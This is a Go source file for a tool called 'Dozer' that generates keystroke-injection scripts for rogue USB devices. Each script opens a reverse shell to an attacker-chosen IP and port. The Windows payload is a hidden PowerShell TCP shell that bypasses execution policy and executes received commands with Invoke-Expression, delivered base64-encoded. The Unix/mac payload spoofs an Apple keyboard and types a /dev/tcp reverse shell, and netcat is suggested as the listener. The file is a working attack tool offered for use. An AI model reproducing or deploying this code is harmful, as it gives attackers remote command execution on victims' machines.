package worker

import (
	"encoding/base64"
	"errors"
	"fmt"
	"net"
	"os"
	"strings"
	"time"
	"unicode/utf16"
)

type Dozer struct {
	IP       string
	Port     int
	OS       string
	Output   string
	Listener bool
}

func NewDozer(ip string, port int, osys, output string, listener bool) (*Dozer, error) {
	if net.ParseIP(ip) == nil {
		return nil, errors.New("invalid IP address")
	}
	if port <= 1024 || port > 65535 {
		return nil, errors.New("port must be between 1025 and 65535")
	}

	return &Dozer{
		IP:       ip,
		Port:     port,
		OS:       osys,
		Output:   output,
		Listener: listener,
	}, nil
}

func (d *Dozer) Create() {
	fmt.Printf(`
						   ▗▄▄▄   ▗▄▖ ▗▄▄▄▄▖▗▄▄▄▖▗▄▄▖ 
						  ▐▌  █ ▐▌ ▐▌   ▗▞▘▐▌   ▐▌ ▐▌
						  ▐▌  █ ▐▌ ▐▌ ▗▞▘  ▐▛▀▀▘▐▛▀▚▖
						  ▐▙▄▄▀ ▝▚▄▞▘▐▙▄▄▄▖▐▙▄▄▖▐▌ ▐▌
                           
								  by no_sh4d3

									   `)
	time.Sleep(1 * time.Second)
	fmt.Println()

	fmt.Println("-------------")
	fmt.Printf("IP: %s\nPort: %d\nOS: %s\n", d.IP, d.Port, d.OS)
	fmt.Println("-------------")

	fmt.Printf("\ngenerating payload for %s reverse shell: %s.ps1\n", d.OS, d.Output)
	switch d.OS {
	case "windows":
		d.createWindowsShell()
	case "linux", "mac":
		d.createUnixShell()
	case "android":
		// we'll use msfvenom
		fmt.Println("android reverse shell not implemented yet.")
	case "ios":
		fmt.Println("iOS reverse shell not implemented yet.")
	default:
		fmt.Println("unsupported OS")
	}

	if d.Listener {
		fmt.Println("[LOG]: starting listener (stub)")
		d.startListener()
	}
}

func (d *Dozer) createWindowsShell() {
	psScript := fmt.Sprintf(`[Console]::TreatControlCAsInput = $true  
  
if (-not ($MyInvocation.Line -match "-nop" -and $host.UI.RawUI.WindowTitle -eq "")) {  
			 $psi = New-Object System.Diagnostics.ProcessStartInfo  
						$psi.FileName = "powershell.exe"  
   $psi.Arguments = "-nop -W hidden -noni -ep bypass -File "$PSCommandPath""  
						  $psi.WindowStyle = "Hidden"  
						  $psi.CreateNoWindow = $true  
			  [System.Diagnostics.Process]::Start($psi) | Out-Null  
									  exit  
									   }  
  
			  $client = New-Object Net.Sockets.TCPClient("%s", %d)  
						 $stream = $client.GetStream()  
				 $writer = New-Object IO.StreamWriter($stream)  
				 $reader = New-Object IO.StreamReader($stream)  
						$buffer = New-Object byte[] 1024  
  
					   function WriteToStream($string) {  
					$writer.Write($string + "DOZER_SHELL> ")  
								$writer.Flush()  
									   }  
  
						   WriteToStream "Connected"  
  
	while (($bytesRead = $stream.Read($buffer, 0, $buffer.Length)) -gt 0) {  
$cmd = ([System.Text.Encoding]::ASCII).GetString($buffer, 0, $bytesRead).Trim()  
									 try {  
			   $output = Invoke-Expression $cmd 2>&1 | Out-String  
								   } catch {  
						 $output = $_.Exception.Message  
									   }  
							 WriteToStream $output  
									   }  
  
								$writer.Close()  
								$reader.Close()  
						$client.Close()`, d.IP, d.Port)

	utf16LE := encodeUTF16LE(psScript)
	b64Encoded := base64.StdEncoding.EncodeToString(utf16LE)

	var dozerScript strings.Builder

	dozerScript.WriteString(`REM rev shell generated with Dozer
			 REM target: ` + fmt.Sprintf("%s:%d", d.IP, d.Port) + `  
								REM by n0_sh4d3
								   DELAY 1000  
									 GUI r  
								   DELAY 500  
				  STRING powershell -nop -w hidden -ep bypass  
									 ENTER  
								   DELAY 2000  
									   `)

	dozerScript.WriteString("STRING $b64=''\n")
	dozerScript.WriteString("ENTER\n")
	dozerScript.WriteString("DELAY 100\n")
	dozerScript.WriteString(fmt.Sprintf("STRING $b64+='%s'\n", b64Encoded))
	dozerScript.WriteString("ENTER\n")
	dozerScript.WriteString("DELAY 50\n")
	dozerScript.WriteString(`REM Execute the reconstructed payload  
STRING [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($b64)) | iex  
									 ENTER  
								   DELAY 500  
								  STRING exit  
									ENTER`)

	filename := d.Output + ".txt"
	err := os.WriteFile(filename, []byte(dozerScript.String()), 0644)
	if err != nil {
		fmt.Printf("Error writing Bruce payload: %v\n", err)
		return
	}

	fmt.Printf("[LOG]: Created %s\n", filename)
}

func (d *Dozer) createUnixShell() {
	script := fmt.Sprintf(`ID 05ac:021e Apple:Keyboard
								   DELAY 1000
								   GUI SPACE
								   DELAY 200
								STRING terminal
								   DELAY 200
									 ENTER
								   DELAY 1000
						  sh -i >& /dev/tcp/%s/%d 0>&1
								   DELAY 1000
									 ENTER
								   DELAY 1000
								`, d.IP, d.Port)

	filePath := d.Output + ".txt"
	err := os.WriteFile(filePath, []byte(script), 0755)
	if err != nil {
		fmt.Println("Error writing shell script:", err)
		return
	}
	fmt.Printf("[LOG]: Created %s\n", filePath)

}

func (d *Dozer) startListener() {
	fmt.Println("Listener not implemented — consider using netcat manually:")
	fmt.Printf("nc -lvnp %d\n", d.Port)
}

func encodeUTF16LE(s string) []byte {
	var utf16Encoded []uint16
	utf16Encoded = utf16.Encode([]rune(s))

	buf := make([]byte, len(utf16Encoded)*2)
	for i, v := range utf16Encoded {
		buf[i*2] = byte(v)
		buf[i*2+1] = byte(v >> 8)
	}
	return buf
}
